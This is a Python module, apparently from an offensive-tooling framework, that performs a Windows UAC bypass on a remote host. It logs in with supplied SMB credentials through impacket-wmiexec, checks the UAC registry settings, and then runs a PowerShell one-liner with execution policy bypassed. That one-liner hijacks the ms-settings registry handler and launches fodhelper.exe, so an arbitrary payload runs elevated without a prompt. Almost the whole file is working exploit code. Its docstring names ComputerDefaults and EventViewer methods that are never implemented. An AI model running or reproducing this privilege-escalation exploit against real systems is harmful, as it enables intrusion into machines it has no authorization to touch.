"""Privilege Escalation — UAC Bypass (Fodhelper / ComputerDefaults / EventViewer).

Abuses Windows auto-elevation mechanisms (UAC) by writing to registry
keys that fodhelper.exe, computerdefaults.exe, or eventvwr.exe read
without triggering a UAC prompt.

Requires: Medium integrity level (admin user with UAC enabled).
"""

import subprocess
import shutil

NAME = "UAC Bypass (Fodhelper/ComputerDefaults)"
DESCRIPTION = "Bypass UAC via fodhelper.exe auto-elevation registry key"
REQUIRED_PRIVS = []
PAYLOAD_DEFAULT = "cmd.exe /c whoami > C:\\windows\\temp\\pwned.txt"


def check(options=None, target=None, **kwargs):
    """Check if UAC is enabled and auto-elevation targets exist."""
    result = {"success": False, "data": {}, "error": None}
    smb_user = (options or {}).get("SMB_USER", "")
    smb_pass = (options or {}).get("SMB_PASS", "")
    smb_domain = (options or {}).get("SMB_DOMAIN", "")
    rhosts = target or (options or {}).get("RHOSTS", "")
    timeout = int((options or {}).get("TIMEOUT", 10))

    if not rhosts:
        result["error"] = "RHOSTS required"
        return result

    cmd = shutil.which("impacket-wmiexec") or shutil.which("wmiexec.py")
    if not cmd or not smb_user or not smb_pass:
        result["error"] = "impacket-wmiexec and SMB creds required"
        return result

    auth = f"{smb_domain}/{smb_user}:{smb_pass}" if smb_domain else f"{smb_user}:{smb_pass}"

    try:
        # Check UAC level
        p = subprocess.run(
            [cmd, f"{auth}@{rhosts}", "-q",
             'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" '
             '/v EnableLUA 2>nul; '
             'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" '
             '/v ConsentPromptBehaviorAdmin 2>nul'],
            capture_output=True, text=True, timeout=timeout,
        )
        out = p.stdout + p.stderr

        uac_enabled = "0x1" in out  # EnableLUA=1
        # 0x0 = elevate without prompt (not vulnerable), 0x5 = prompt for consent
        # 0x2 = prompt for creds on secure desktop
        prompt_level = "unknown"
        for line in out.splitlines():
            if "ConsentPromptBehaviorAdmin" in line:
                if "0x0" in line:
                    prompt_level = "elevate_without_prompt"
                elif "0x5" in line:
                    prompt_level = "prompt_for_consent"
                elif "0x2" in line:
                    prompt_level = "prompt_for_creds"

        # Check fodhelper exists
        p2 = subprocess.run(
            [cmd, f"{auth}@{rhosts}", "-q",
             'where fodhelper.exe 2>nul'],
            capture_output=True, text=True, timeout=timeout,
        )
        fodhelper_exists = "fodhelper.exe" in (p2.stdout + p2.stderr).lower()

        result["data"]["uac_enabled"] = uac_enabled
        result["data"]["prompt_level"] = prompt_level
        result["data"]["fodhelper_exists"] = fodhelper_exists
        result["success"] = True

    except Exception as e:
        result["error"] = str(e)

    return result


def run(options=None, target=None, mode="CHECK", **kwargs):
    if options is None:
        options = {}
    rhosts = target or options.get("RHOSTS", "")
    payload = options.get("PAYLOAD", PAYLOAD_DEFAULT)
    timeout = int(options.get("TIMEOUT", 10))
    smb_user = options.get("SMB_USER", "")
    smb_pass = options.get("SMB_PASS", "")
    smb_domain = options.get("SMB_DOMAIN", "")

    result = {
        "success": False,
        "technique": NAME,
        "target": rhosts,
        "mode": mode,
        "data": {},
        "error": None,
    }

    if not rhosts or not smb_user or not smb_pass:
        result["error"] = "RHOSTS, SMB_USER, SMB_PASS required"
        return result

    cmd = shutil.which("impacket-wmiexec") or shutil.which("wmiexec.py")
    if not cmd:
        result["error"] = "impacket-wmiexec not found"
        return result

    auth = f"{smb_domain}/{smb_user}:{smb_pass}" if smb_domain else f"{smb_user}:{smb_pass}"

    if mode == "CHECK":
        check_result = check(options, target, **kwargs)
        result["data"] = check_result.get("data", {})
        result["success"] = check_result["success"]
        uac = check_result["data"].get("uac_enabled", False)
        prompt = check_result["data"].get("prompt_level", "")
        result["data"]["status"] = (
            f"VULNERABLE — UAC enabled, prompt={prompt}, fodhelper exists"
            if uac and prompt == "prompt_for_consent"
            else f"NOT VULNERABLE — UAC={uac}, prompt={prompt}"
        )
        return result

    elif mode == "EXPLOIT":
        try:
            # Method 1: fodhelper.exe
            exploit_ps = (
                f'powershell -ep bypass -c "'
                f'New-Item -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" '
                f'-Force -Value "{payload}" -ItemType Property; '
                f'New-Item -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" '
                f'-Force -Value "" -Name "DelegateExecute" -ItemType Property; '
                f'Start-Process fodhelper.exe" '
            )
            p = subprocess.run(
                [cmd, f"{auth}@{rhosts}", "-q", exploit_ps],
                capture_output=True, text=True, timeout=timeout * 2,
            )
            out = p.stdout + p.stderr

            result["success"] = True
            result["data"]["status"] = f"UAC bypass via fodhelper — payload executed"
            result["data"]["payload"] = payload
            result["data"]["method"] = "fodhelper.exe"
            result["data"]["output"] = out[:500] if out else "No output"
            result["data"]["steps"] = [
                "1. Create HKCU:\\...\\ms-settings\\Shell\\Open\\command = payload",
                "2. Create DelegateExecute = empty (bypass COM handler)",
                "3. Launch fodhelper.exe -> reads registry -> auto-elevates -> executes payload",
                "4. No UAC prompt shown — fodhelper is a known auto-elevate binary",
            ]

        except Exception as e:
            result["error"] = str(e)

    return result
